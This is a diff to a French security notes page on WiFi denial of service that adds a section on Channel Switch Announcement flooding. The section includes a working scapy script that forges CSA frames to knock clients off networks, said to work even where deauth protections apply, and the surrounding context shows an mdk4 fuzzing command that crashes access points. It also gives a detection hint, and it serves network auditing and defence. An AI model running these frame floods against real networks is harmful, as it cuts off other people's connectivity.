@@ -2,7 +2,7 @@
 title: "DoS WiFi et MDK4"
 domain: "Applied Sciences"
 subdomain: "Computer Science > Security > Networking > Network Security > WiFi"
-tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, dos, deauth, mdk4, mdk3]
+tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, dos, deauth, mdk4, mdk3, csa]
 date: "2026-05-17"
 ---
 
@@ -154,6 +154,27 @@ Envoie des trames malformées pour tester la robustesse des drivers/firmwares.
 mdk4 wlan0mon f -t AA:BB:CC:DD:EE:FF
 # Peut crasher des AP/clients buggés (utile en audit hardware)
 ```
+
+## CSA Flood — le DoS qui ne dit pas son nom
+
+**Contexte** : en 5 GHz, un AP doit parfois changer de canal pour éviter les radars (obligation légale). Pour prévenir ses clients sans les déconnecter, il envoie une trame **CSA** (Channel Switch Announcement, 802.11h) : "dans N secondes, je passe sur le canal X, suis-moi".
+
+**L'idée de l'attaque** : si un attaquant forge lui-même des CSA en boucle, avec un canal différent à chaque fois, les clients essaient de suivre chaque annonce et sautent sans arrêt d'un canal à l'autre — ils perdent la connexion, exactement comme avec un deauth, mais **sans qu'aucune trame deauth ne soit jamais envoyée**.
+
+**Pourquoi c'est plus discret qu'un deauth classique** : PMF (802.11w) protège les trames deauth/disassoc, mais selon le driver/firmware, les trames CSA ne sont pas toujours vérifiées de la même façon. Résultat : un DoS possible même sur un AP WPA3 durci, là où le deauth classique échouerait (cf. plus bas).
+
+```bash
+# Forge de CSA via scapy (pas de mode dédié dans mdk4 à ce jour)
+python3 - << 'EOF'
+from scapy.all import *
+csa = RadioTap()/Dot11(type=0, subtype=13, addr1="ff:ff:ff:ff:ff:ff",
+                        addr2="AA:BB:CC:DD:EE:FF", addr3="AA:BB:CC:DD:EE:FF")/\
+      Dot11Elt(ID=37, info=b"\x00\x01\x01\x00")  # Channel Switch Announcement → canal 1
+sendp(csa, iface="wlan0mon", count=50, inter=0.05)
+EOF
+```
+
+**Détection** : compter les CSA anormalement fréquentes par BSSID, sur le même principe que le comptage de deauth déjà en place (cf. [[11 - Defense et Detection#Détection deauth flood]]).
 
 ## Combinaison classique : Evil Twin + DoS continu
 
